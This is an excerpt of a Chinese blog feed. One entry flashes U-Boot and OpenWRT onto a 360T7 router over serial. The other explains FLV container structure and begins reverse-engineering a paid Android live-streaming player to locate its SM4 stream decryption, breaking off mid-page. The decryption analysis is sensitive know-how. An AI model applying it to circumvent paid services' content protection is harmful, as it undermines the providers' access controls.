    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>家里原来用的是运营商给的 吉比特GS3101，这款是光猫路由器二合一，虽然只有 2.4G，但因主用网线，一直没动力更换。</p><p>最近看到 恩山 很多人在玩 360T7，一百出头，用来替换使用频率不高的无线正好，于是咸鱼花了 146 入手一个。</p><p>这款路由器是 MT7981BA + MT7976C，内存 256MB 闪存 128MB，拆机细节：<a href="https://www.acwifi.net/22217.html">https://www.acwifi.net/22217.html</a></p><h2 id="刷不死-UBOOT"><a href="#刷不死-UBOOT" class="headerlink" title="刷不死 UBOOT"></a>刷不死 UBOOT</h2><p>这款只能拆机使用 TTL 刷入 UBOOT。</p><h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>吹风机狂吹贴纸 1 分钟，用刀片起一小角，撕开后卸下两个螺丝，然后用撬棒从卡口缝隙往外翘开。</p><p>安装 <a href="https://www.ftdichip.cn/Drivers/D2XX.htm">FT232R 驱动</a>，短接 3.3V 和 s1，杜邦线接 RX, TX, GND。</p><p>主板的接口从方形孔往左依次为：GND, TX, RX，然后依次接到对应的杜邦线：GND, RX, TX。</p><p>使用 MobaXterm 来连接串口，速率 115200bps，然后接通电源开机，同时不断按 f 进入 failsafe 模式。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启 uboot 菜单 3s 延迟</span></span><br><span class="line">root@(none):/<span class="comment"># fw_setenv bootmenu_delay 3</span></span><br><span class="line"><span class="comment"># 挂载 rootfs</span></span><br><span class="line">root@(none):/<span class="comment"># mount_root</span></span><br><span class="line"><span class="comment"># 先修改 root 密码为 password</span></span><br><span class="line">root@(none):/<span class="comment"># passwd root</span></span><br><span class="line"><span class="comment"># 开启网络</span></span><br><span class="line">root@(none):/<span class="comment"># ifconfig eth0 0.0.0.0</span></span><br><span class="line">root@(none):/<span class="comment"># brctl addbr br-lan</span></span><br><span class="line">root@(none):/<span class="comment"># ifconfig br-lan 192.168.2.1 netmask 255.255.255.0 up</span></span><br><span class="line">root@(none):/<span class="comment"># brctl addif br-lan eth0</span></span><br></pre></td></tr></table></figure><p>电脑网线连接 360T7 LAN 口，网卡设置 ip 为 <code>192.168.2.2</code>，接下来将使用 hfs 传输 UBOOT 固件。</p><h3 id="刷入-UBOOT"><a href="#刷入-UBOOT" class="headerlink" title="刷入 UBOOT"></a>刷入 UBOOT</h3><p>从 <a href="https://github.com/hanwckf/bl-mt798x/releases/">hanwckf</a> 大佬的项目中下载新版 UBOOT，然后拖入 hfs。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 记得校验</span></span><br><span class="line">wget -P /tmp http://192.168.2.2/mt7981_360t7-fip-fixed-parts.bin</span><br><span class="line"><span class="built_in">md5sum</span> /tmp/mt7981_360t7-fip-fixed-parts.bin</span><br><span class="line"><span class="comment"># mtd 刷入固件</span></span><br><span class="line">mtd erase fip</span><br><span class="line">mtd write /tmp/mt7981_360t7-fip-fixed-parts.bin fip</span><br><span class="line">mtd verify /tmp/mt7981_360t7-fip-fixed-parts.bin fip</span><br></pre></td></tr></table></figure><p>这样就刷完固定分区 UBOOT 了。</p><h2 id="刷入-固件"><a href="#刷入-固件" class="headerlink" title="刷入 固件"></a>刷入 固件</h2><p>固件选用的是 <a href="https://www.right.com.cn/forum/thread-8263340-1-1.html">237176253</a> 大佬的。</p><p>用牙签按住路由器的 RESET 按钮后通电开机，然后断开 Wifi 以防冲突，网卡设置地址为统一网段下：<code>192.168.1.2</code>，用浏览器进入 <code>192.168.1.1</code></p><p>在 UBOOT 恢复界面上传，刷入固件，第一次刷入会在 MobaXterm 中看到提醒 ubi 错误，刷新 192.168.1.1 后重新上传刷入即可。</p><p>这样就刷好了固件，连接光猫，重启路由器，会出现一个 无密码的 WIFI，连上，打开 192.168.6.1，使用 password@root，进入后台首先重置密码。</p><h2 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h2><p>装机师傅当初给了光猫超级密码，然后查看 PPPOE 账号密码，<code>2_INTERNET_R_VID_200</code> 中路由直接改桥接，其他不变即可。</p><p>OpenWRT 中 WAN 口使用 PPPOE 拨号，新建 WAN 口为 DHCP 客户端访问光猫，修改 ipv6 为 nat，开启 OpenClash + <a href="https://raw.githubusercontent.com/o0HalfLife0o/list/master/ad.txt">去广告</a>，内存还剩 60M，大功告成！</p>]]></content>
    
    
    <summary type="html">百元最强 Wifi6 机 刷入 OpenWRT</summary>
    
    
    
    <category term="HomeLab" scheme="https://yzctzl.github.io/categories/HomeLab/"/>
    
    
    <category term="HomeLab" scheme="https://yzctzl.github.io/tags/HomeLab/"/>
    
    <category term="Router" scheme="https://yzctzl.github.io/tags/Router/"/>
    
    <category term="OpenWRT" scheme="https://yzctzl.github.io/tags/OpenWRT/"/>
    
  </entry>
  
  <entry>
    <title>FLV：不许动手动脚</title>
    <link href="https://yzctzl.github.io/2022/ReFLV/"/>
    <id>https://yzctzl.github.io/2022/ReFLV/</id>
    <published>2022-11-30T16:00:00.000Z</published>
    <updated>2022-11-30T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文将着重分析 <code>FLV</code> 容器的语法语义，结合我遇到的几个安卓平台的 <code>FLV</code> 加密进行分析，同时对这几个样本做解密还原。</p><p><strong>由于许多内容是对学习的记录，所以并非一次编辑而成，可能有些逻辑问题。加上我对音视频多数内容一知半解，可能存在一些错误，欢迎大佬指出，感谢！</strong></p><h2 id="FLV"><a href="#FLV" class="headerlink" title="FLV"></a>FLV</h2><p>尽管绝大多数情况下加密方案都不会修改 <code>FLV</code> 容器，但了解容器的语法语义能帮助我们定位加密位置，所以这是后面的基础。</p><p><code>FLV</code> 容器标准可以在 <code>spec</code><a href="https://download.macromedia.com/f4v/video_file_format_spec_v10_1.pdf">^01</a> 的 <code>Annex.E</code> 中找到，若已经熟悉 <code>FLV</code> 容器可以跳过这部分。</p><p>与其他容器相比，<code>FLV</code> 中视频的特点是以一个完整的帧为单位的，无论这个帧是何类型或者是否包含多个 <code>NALu/slice</code>，一个基本单位是对一个帧的封装，当然仅有帧是无法解码的，编码参数（<code>SPS</code><a href="https://mp.weixin.qq.com/s/knlIStZqa7EJSdDczqE63w">^07</a>、<code>PPS</code><a href="https://mp.weixin.qq.com/s/0tUWQX8uodizv-LdQLhXlA">^08</a> 等）也要有，它们都在第一个帧之前；而音频可能是一到几个帧为一个单位。<code>FLV</code> 中的这个基本单位被称为 <code>Tag</code>。</p><h3 id="容器标准"><a href="#容器标准" class="headerlink" title="容器标准"></a>容器标准</h3><p>本节我们看一下标准中 <code>FLV</code> 容器的语法，其中大部分都能用 <code>ReFLV</code><a href="https://github.com/yzctzl/ReFLV">^13</a> 解析。</p><h4 id="FLV-header"><a href="#FLV-header" class="headerlink" title="FLV header"></a>FLV header</h4><p><code>FLV</code> 文件的前 <code>9</code> 个字节是文件头，其中有两个标志位分别表示是否包含音频和视频：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.01.png' data-fancybox='default' data-caption='FLV header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="FLV header"></a><span class='image-caption'>FLV header</span></div></div><p>对这部分使用 <code>parse_flv_header</code> 来解析，对应的数据类是 <code>TAGheader</code>；如果无法解析一般考虑是否存在其他问题，比如是否缺失文件头或者是否已被完整加密，因为单独加密文件头意义不大。</p><h4 id="FLV-body"><a href="#FLV-body" class="headerlink" title="FLV body"></a>FLV body</h4><p>文件头之后的就是一个接一个的 <code>Tag + TagSize</code> 直到 <code>EOF</code>：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.02.png' data-fancybox='default' data-caption='FLV struct'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.02.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="FLV struct"></a><span class='image-caption'>FLV struct</span></div></div><p>为了方便，把 <code>PreviousTagSizeN</code> 看作 <code>TagN</code> 的一部分。一个 <code>Tag</code> 使用一个数据类 <code>Tag</code> 表示。</p><p>在一帧一个 <code>Tag</code> 之前，最开始的第一个 <code>Tag</code> 封装的是 <code>onMetadata</code>，它表示了容器层面的音视频信息，也是 rtmpdump 的输出信息，大多数情况下无需处理，不过也有种特殊情况：如果多个视频共用一个直播链接，比如：开始播放时画面为 <code>720p</code> 横向，中间换了直播设备变成 <code>1080p</code> 竖向，整个过程链接不变就导致它们被下载到一个 <code>FLV</code> 文件中，这样的 <code>FLV</code> 仅能播放第一小段。</p><p>在 <code>ReFLV</code> 中有个 <code>splite_out()</code> 函数可以将多段视频分成多个 <code>FLV</code> 文件，分隔规则为：视频使用 <code>onMetadata</code> 音频使用 <code>AAC header</code>，遇到这两种类型就写入下一个 <code>FLV</code> 中。</p><p>接下来的 <code>Tag</code> 里面封装的是初始化信息 <code>SPS</code><a href="https://mp.weixin.qq.com/s/knlIStZqa7EJSdDczqE63w">^07</a>、<code>PPS</code><a href="https://mp.weixin.qq.com/s/0tUWQX8uodizv-LdQLhXlA">^08</a> 等，这些参数优先级最高也是最重要的，一旦丢失将无法解码，因为它提供解码器所必须的解码信息。</p><h4 id="Tag-header"><a href="#Tag-header" class="headerlink" title="Tag header"></a>Tag header</h4><p><code>Tag</code> 可以分成两部分，前半部分是 <code>header：</code></p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.03.png' data-fancybox='default' data-caption='Tag header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.03.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Tag header"></a><span class='image-caption'>Tag header</span></div></div><p>把红框中的部分看作 <code>Tag header</code> 对应 <code>Tag</code> 数据类中的 <code>header</code>，使用数据类 <code>TAGheader</code> 表示。</p><p>这其中黄色的部分是 <code>Tag header</code> 之后剩余部分的大小，也就是说：可以读 <code>11B</code>，解析之后就知道剩余的 <code>Tag</code> 大小了，使用 <code>next_tag</code> 来实现读取过程，<code>parse_tag_header</code> 来解析这 <code>11B</code> 的内容，若做出了修改就用 <code>build_tag_header</code> 重新生成新的 <code>Tag header</code>；同样当解密完成之后需要写入目标 <code>FLV</code> 时，有对应的 <code>write_tag</code>。</p><p>另一个重要的部分是时间戳，一共 <code>4B</code>，又称<code>解码时间戳（DTS）</code>，直播开始后时间戳在从 0 开始递增，但绝大多是情况下我们都是从直播开始之后一段时间才能获取到直播流，因此得到的 <code>DTS</code> 并非从 0 时刻开始；还有些时候会因为连麦、推流网络问题等得到错乱的时间戳。</p><p>时间戳错误会导致许多离谱的问题，比如会导致音画不同步，严重一点的造成无法播放，时间戳重叠时甚至可以隐藏一段视频，这是因为播放器会把小于当前时间戳的帧忽略，这在直播中有利于减少丢包造成的延迟累积，但 <code>FLV</code> 中显然会造成非预期效果；</p><p>另一方面，常用的 <code>ffmpeg</code> 是通过包含 <code>Video/Audio header</code> 的 <code>Tag</code> 解析结果来重置时间戳，而有时会遇到的 <code>header</code> 中时间戳也不正确；</p><p>更好的方法应该是选择第一个关键帧所在 <code>Tag</code> 作为时间戳原点，然后对音频和视频的时间戳与该原点计算偏移作为新的时间戳；之所以选关键帧，因为它是需要解码的一帧完整的画面，这与其他包含编码参数的 <code>Tag</code> 的时间戳不同，它的时间戳是直接影响<code>显示时间 (PTS)</code>。</p><p>修复时间戳对应的是 <code>reset_timestamp</code>。接下来的是音视频的 <code>header</code>。最后是包含码流的 <code>Data</code>：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.04.png' data-fancybox='default' data-caption='Tag Data'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.04.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Tag Data"></a><span class='image-caption'>Tag Data</span></div></div><p>这里的 <code>Data</code> 是最容易动手脚的地方，遇到的例子中都对这部分做了加密，后面再说。先看一下 <code>Video Tag header</code>：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.05.png' data-fancybox='default' data-caption='Video Tag header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.05.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Video Tag header"></a><span class='image-caption'>Video Tag header</span></div></div><p>包含了<code>帧类型、Codec、Data</code> 中码流类型以及<code>相对时间戳（CTS）</code>，一帧画面的显示时间是通过 <code>PTS = CTS + DTS</code> 来计算的，使用 <code>parse_video_header</code> 来解析，解密或者修改完之后使用 <code>build_video_header</code> 重新构建。</p><p>跟在 <code>Video Tag header</code> 之后的 <code>Data</code> 是 <code>VideoPacket</code>：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.07.png' data-fancybox='default' data-caption='Audio Tag header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.07.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Audio Tag header"></a><span class='image-caption'>Audio Tag header</span></div></div><p><code>Audio</code> 和 <code>Video</code> 类似：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.06.png' data-fancybox='default' data-caption='AVCPacket'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.06.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="AVCPacket"></a><span class='image-caption'>AVCPacket</span></div></div><p>包括音频编码器、几个参数，最后是 <code>Data</code> 中音频包的类型，使用 <code>parse_audio_header</code> 来解析，解密或者修改完之后使用 <code>build_audio_header</code> 重新构建。其后跟上 <code>AudioPacket</code>。</p><h4 id="NALU"><a href="#NALU" class="headerlink" title="NALU"></a>NALU</h4><p><code>NALU</code> 是网络抽象层单元缩写，顾名思义，这是为了适应网络传输和数据存储而做的码流分割，<code>H.264/H.265</code> 中都有它，<code>FLV</code> 使用的 <code>NALu</code> 码流语法在 <code>ISO/IEC 14496-15</code> 中，语法为：<code>单元长度（4B） + NALU header（AVC：1B，HEVC：2B） + payload(RBSP)</code>，其实就是把常见的<code>附录 B</code> 格式中 <code>StartCode（可以为 0x000001/0x00000001）</code> 替换成了 <code>单元长度（4B）</code>，其中：负载是喂给 <code>decoder</code> 解码的，<code>AVC NALU header</code> 语义如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.08.png' data-fancybox='default' data-caption='NALU header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.08.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="NALU header"></a><span class='image-caption'>NALU header</span></div></div><p><code>f(x)</code> 和 <code>u(x)</code> 都是顺序读取 <code>x</code> 位，其中 <code>nal_unit_type</code> 决定负载的语法，其定义如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.09.png' data-fancybox='default' data-caption='nal_unit_type'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.09.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="nal_unit_type"></a><span class='image-caption'>nal_unit_type</span></div></div><p>其中 <code>1</code> 表示 <code>IDR</code>，<code>5</code> 是最常见的 <code>I/P/B</code> 帧，<code>7、8</code> 分别表示 <code>SPS、PPS</code>。这部分使用 <code>parse_avc_nalu</code> 来解析，因为一个帧可以分割为多个 <code>NALu/slice</code> 所以这里需要根据最开始的 <code>4B</code> 单元长度判断每个 <code>nalu</code> 长度。</p><p><code>HEVC NLAU header</code> 语法如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.1.10.png' data-fancybox='default' data-caption='nal_unit_type'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.1.10.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.1.10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="nal_unit_type"></a><span class='image-caption'>nal_unit_type</span></div></div><p>一共 <code>2B</code>，其中 <code>nal_unit_type(6bits)</code> 用来标识NAL单元类型，包括<code>参数集（VPS，PPS，SPS，SEI）</code>以及 <code>slice</code> 数据如 <code>IDR/I/B/P</code> 等。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>上面这些都在标准内，截取了部分常遇到的，详细了解可以阅读标准。了解语法语义之后可以用 <code>flvAnalyser</code><a href="https://github.com/zymill/flvAnalyser">^06</a> 或 010 Editor + <code>FLV.bt</code><a href="https://www.sweetscape.com/010editor/repository/templates/file_info.php?file=FLV.bt">^10</a> 辅助分析，比如：某 FLV 音频正常却花屏，而上述这些分析后一切正常，那可以确定 VideoPacket 一定动手脚了。</p><h4 id="Annex-F"><a href="#Annex-F" class="headerlink" title="Annex.F"></a>Annex.F</h4><p>标准附录 F 中可以看到 FLV 的加密方案，在 <code>Adobe Primetime SDK</code><a href="https://experienceleague.adobe.com/docs/primetime/drm/home.html?lang=zh-Hans">^09</a> 中的 <code>DRM</code> 部分也可以找到对应的接口。它的 <code>key</code> 需要 <code>Adobe</code> 自家的 <code>DRM</code> —— <code>Adobe Access</code> 来分发，由于我比较菜，这种我还从未遇到过，所以就先略过该部分了。</p><h3 id="扩展编码"><a href="#扩展编码" class="headerlink" title="扩展编码"></a>扩展编码</h3><p><code>FLV</code> 自 Adobe 在 2003 年发布以来，历经 20 年的发展，已经进入耄耋之年。虽与主流的 <code>mp4/mkv</code> 容器比起来，<code>FLV</code> 并不能算古老，但它却实实在在地是一种老气横秋的容器，主因是 Adobe 不愿继续维护该标准了。但 FLV 简单轻量，而且它的头是完备无依赖的，又有良好的 Web 服务器支持，延迟更是可以做到 100ms，使其在直播场景中仍然常见。</p><p>可如今 <code>FLV</code> 本身支持的编码已经逐渐无法满足需求了，为了延续其生命周期，需要扩展标准来添加对新一代视频编码的支持。</p><h4 id="HEVC"><a href="#HEVC" class="headerlink" title="HEVC"></a>HEVC</h4><p><code>FLV</code> 对新的 <code>h.265/hevc</code> 没有支持，新的编码标准压缩率更高，更加节省带宽，支持的分辨率也更高，已经逐渐成为主流，而我们要做的扩展主要是添加 <code>video codec id</code> 然后替换为对应编码的 <code>VIDEOPACKET</code>。</p><p>目前对 <code>HEVC</code> 常用的 <code>video codec id</code> 是 <code>12</code>，扩展标准如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/1.2.01.png' data-fancybox='default' data-caption='hevc+flv'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/1.2.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/1.2.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="hevc+flv"></a><span class='image-caption'>hevc+flv</span></div></div><p>该扩展由金山云提出 <code>ksvc</code><a href="https://github.com/ksvc/FFmpeg/wiki">^02</a>，并做了 <code>FFmpeg</code> 的 patch，这是最常见的扩展。</p><h4 id="AV1-Opus"><a href="#AV1-Opus" class="headerlink" title="AV1&#x2F;Opus"></a>AV1&#x2F;Opus</h4><p>类似 <code>HEVC</code>，<code>AV1</code> 的扩展 <code>video codec id</code> 是 <code>13</code>，<code>AV1</code> 是 <code>AOM</code> 联盟开发的一种视频编码，该联盟由谷歌等大型公司主导，对标下一代视频编码 <code>h.266/VVC</code>，其编码复杂度相对较高，不过开源无专利费，很多云厂商都实现了该扩展，具体扩展可参考 <code>AV1patch</code><a href="https://github.com/tencentyun/AV1">^03</a>。</p><p><code>Opus</code> 扩展的 <code>audio codec id</code> 为 <code>9</code> 或 <code>13</code>；<code>Opus</code> 在人声上有不俗的表现，但通用场景中，其在低码率下和 <code>HE-AAC</code> 相比优势并不明显，中高码率的表现又不及标准的 <code>AAC-LC</code>，虽然开源免费但处境尴尬，因此该扩展用的相对较少。</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><code>HEVC/AV1</code> 的扩展在 <code>flvAnalyser</code><a href="https://github.com/zymill/flvAnalyser">^06</a> 中有不错的支持，不过它遇到加密无法解析时会崩溃。相对而言 <code>010 Editor</code> 可以 Debug 模板，更容易定位问题，我对官方仓库的 <code>FLV</code> 模板添加了 <code>HEVC/AV1/Opus</code> 的支持，该模板也放在了 <code>ReFLV</code><a href="https://github.com/yzctzl/ReFLV">^13</a> 仓库中。</p><p>针对 HEVC 扩展，我 patch 了最新的 <code>FFmpeg v5.1</code> 版，又用 <code>GitHub Action</code> 编译了 <code>Windows/Linux/MacOS</code> 三个平台上的成品 <code>minibuild</code><a href="https://github.com/yzctzl/ffmpeg-minibuild/releases/tag/v5.1.1-beta.1">^04</a>，可以直接下载使用。此外应用 <code>AV1patch</code><a href="https://github.com/tencentyun/AV1">^03</a> 来支持 <code>HEVC/AV1/Opus</code> 三种扩展，但 AV1 需要 dav1d 库，需要自己在所需平台编译。</p><p><code>ffplay</code> 毕竟过于简陋，有没有其他现成的播放器支持 <code>HEVC</code> 扩展呢，我尝试了很多款，发现 <code>Aplayer</code><a href="http://aplayer.open.xunlei.com/">^05</a> 对 <code>FLV + HEVC</code> 有较好的支持，这款 <code>SDK</code> 对 <code>FLV</code> 容错性比主流播放器做的好很多，推荐选择一款基于该 <code>SDK</code> 的播放器。</p><h2 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h2><p>音视频开发中一个绕不开的工具就是 <code>FFmpeg</code>，俗话讲：掌握了 <code>FFmpeg</code> 就掌握了音视频开发的半壁江山。安卓音视频开发中更是如此，比如常见的 <code>ijkplayer</code> 就是基于 <code>FFmpeg 3.4</code> 版本的。</p><p>在对 <code>FLV</code> 的加解密中最常见的也是使用动过手脚的 <code>FFmpeg</code> 或者基于 <code>FFmpeg</code> 开发的工具。</p><p>下面关于 <code>FFmpeg</code> 的介绍具体可以参考 <code>雷神</code><a href="https://blog.csdn.net/leixiaohua1020">^11</a> 的博客中 <code>FFmpeg 专栏</code>，雷神千古，向雷神致敬！</p><h3 id="Demuxer"><a href="#Demuxer" class="headerlink" title="Demuxer"></a>Demuxer</h3><p>要魔改 FFmpeg 实现加密和解密音视频帧，最直接的方法是：写入时加密，读取时解密。</p><p>这样做的好处主要是：</p><ol><li>避免深入，改起来简单</li><li>H.264&#x2F;H.265 编码可以通用</li><li>与容器无关，FLV&#x2F;MP4&#x2F;MKV 等统统适用</li></ol><p>直接看调用结构图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.1.01.png' data-fancybox='default' data-caption='ffplay demux'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.1.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.1.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ffplay demux"></a><span class='image-caption'>ffplay demux</span></div></div><p><code>ffplay</code> 可类比在安卓客户端中常见的任一款基于 <code>ffmpeg</code> 的播放器。</p><p><code>read_frame_internal()</code>：封装了完整的解复用过程（<code>demuxer</code>），也是最容易做手脚的地方，调用它就可以得到一帧。取帧时会从 <code>ff_read_packet()</code> 读取，这个函数负责与 <code>IO</code> 打交道，如果一切顺利会判断是否需要来进一步解析，如果需要交给 <code>parse_packet()</code>。</p><p><code>flv_read_packet()</code>：负责读取读取和解析 <code>Tag header</code>、<code>Video Tag header</code>、<code>Audio Tag header</code>，并对 <code>H.264、AAC</code> 等做一些特殊处理；如果某魔改 FFmpeg 可以处理非标准 <code>FLV</code> 容器，那首先怀疑是否对该函数动了手脚。</p><h4 id="实例-N"><a href="#实例-N" class="headerlink" title="实例 N"></a>实例 N</h4><p>这是某收费直播系统的安卓平台，该系统的播放器基于 FFmpeg，用 C++ 开发，不开源，无混淆。抓个源下载一会，得到视频样本，试播放灰屏无声音，拖入 <code>010 Editor</code> 分析发现头都是完整的，符合标准未加密，推测更深层的 <code>payload(RBSP)</code> 加密了：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.1.02.png' data-fancybox='default' data-caption='N sample'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.1.02.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.1.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="N sample"></a><span class='image-caption'>N sample</span></div></div><p>接下来用 <code>IDA</code> 打开 <code>N.so</code>，因为 FFmpeg 各版本差异很大，要首先判断 FFmpeg 版本号，搜字符串 <code>version</code> 找到版本号为 <code>4.1.4</code>，从 <code>videolan</code><a href="https://www.videohelp.com/software/ffmpeg/old-versions">^12</a> 下载该版本源码后用 Source Insight 打开，方便对照查看。</p><p>然后注意到导出表如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.1.03.png' data-fancybox='default' data-caption='NMC export'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.1.03.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.1.03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="NMC export"></a><span class='image-caption'>NMC export</span></div></div><p>里面包含许多种加密解密，根据分析，视频播放过程中可能存在某个解密函数被频繁调用，大胆猜测它就在导出表中，直接 <code>trace</code> 一下，轻易找到了它：<code>sm4_decrypt</code>。</p><p>由此查看调用，马上就找到 <code>sm4_decrypt</code> 被 <code>read_frame_internal(AVFormatContext, AVPacket)</code> 调用，对照源码分析如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" 